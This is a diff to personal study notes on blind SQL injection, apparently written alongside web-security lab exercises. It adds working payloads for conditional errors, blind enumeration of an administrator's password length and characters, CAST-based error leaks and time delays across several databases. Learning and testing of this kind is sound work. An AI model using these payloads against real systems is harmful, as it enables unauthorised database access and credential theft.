@@ -58,12 +58,12 @@ UNION SELECT NULL
 > Application doesn't return the results of the query or details of errors in its response.
 
 > To detect a blind vulnerability:
-1. Change logic of query to trigger a detectable difference. Such as boolean logic or generate erros such as dividing by zero.
+1. Change logic of query to trigger a detectable difference. Such as boolean logic or generate erros such as dividing by zero. Try true and false use cases. 
 2. Trigger a time delay using boolean injection to detect when the delay occurs in which boolean value.
 3. Trigger an out-of-band network interaction Out-of-band application security testing (OAST). For instance placing the data retrieved in a [[Domain Name System (DNS)]] lookup for a domain that you control.
 
 
-##### Tracking Cookies
+##### Tracking [[Cookies]]. 
 > Some applications use tracking cookies to gather data about usage and users.
 > They are processed by a SQL query such as: 
 ```
@@ -71,6 +71,82 @@ SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
 ```
 > The behaviour of the website can then be used to determine how the injection is vulnerable.
 > Triggering different responses through false and true conditions.
+
+> Use the value of the cookie along with true or false expressions using the `AND` operator to see how the website behaves differently.
+> Use this information of true/false behaviours to exploit the website.
+
+##### Conditional Errors LAB 13 IN WALKTHROUGHS
+
+> Sometimes boolean conditions do not affect the responses.
+> So we can trigger SQL errors conditionally, causing database errors. This might affect the response.
+> Trigger an error when the condition is true, otherwise, don't trigger an error. Check for [[HTTP]] response code 500.
+```
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END)='' --
+xyz' || (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END)||' --
+```
+> Use concatenation for easier expressions. Do not need to check equality in the end.
+
+> Knowing that the `FROM` part of a query is evaluated first then the `SELECT` part, lets use that to try and find the administrator user. `TO_CHAR` in oracle.
+```
+xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') || ' --
+```
+> If the administrator username exists, then the SELECT query will be evaluated as the FROM part succeeded. The CASE statement is always true, so it will trigger an error. This error can be used in blind injections to alter the response.
+> If the FROM part fails, then the SELECT CASE part won't even run. The page will return normally.
+
+>To add any more conditions, add `AND` in the FROM clause.
+```
+xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') AND length(password)>5 || ' --
+```
+
+##### Blind Enumeration 
+
+* Check for the presence of a table:
+```
+HNgNNAq7tdrY9x17' AND (SELECT 'x' FROM users LIMIT 1)='x' --'
+HNgNNAq7tdrY9x17' AND (SELECT 'x' FROM users WHERE ROWNUM=1)='x' --'   //oracle
+```
+> This returns an 'x' for every row in the table. we limit to 1 to check for only 1 x returned. If there is no x returned, then there is no table, or there are no rows in that table.
+
+* Check for the presence of an entry:
+```
+HNgNNAq7tdrY9x17' AND (SELECT username FROM users WHERE username='administrator')='administrator' --'
+```
+
+* Check for the length of a row entry:
+```
+HNgNNAq7tdrY9x17' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password) > 1 )='administrator' --'
+```
+
+* Check for the characters of a row entry: (`substr` for oracle)
+```
+HNgNNAq7tdrY9x17' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator')='a' --'
+```
+
+#### Verbose SQL Error Messages
+
+> The error message shows the query we are injecting in, as well as the error message.
+> We can make the error message include the sensitive data we need.
+
+> Done using the `CAST()` function, which converts data into different data types.
+```
+CAST((SELECT x FROM y) AS int)
+```
+> We usually want string type data. This will return an error message saying invalid data type with the requested data x from table y.
+
+##### Time Delays
+
+> Delaying the SQL queries causes a delay in the [[HTTP]] response.
+> Use this delayed time to infer the truth of our query.
+
+```
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+```
+> If the condition is true, that is the first letter of the admin password is larger than m, then the response will come after a given delay.
+
+* Microsoft: `WAITFOR DELAY '0:0:<delay>'
+* PostgreSQL: `SELECT pg_sleep(delay)`
+* MySQL: `SELECT SLEEP(10)`
+* Oracle: `dbms_pipe.receive_message('a',10)
 
 ---
 
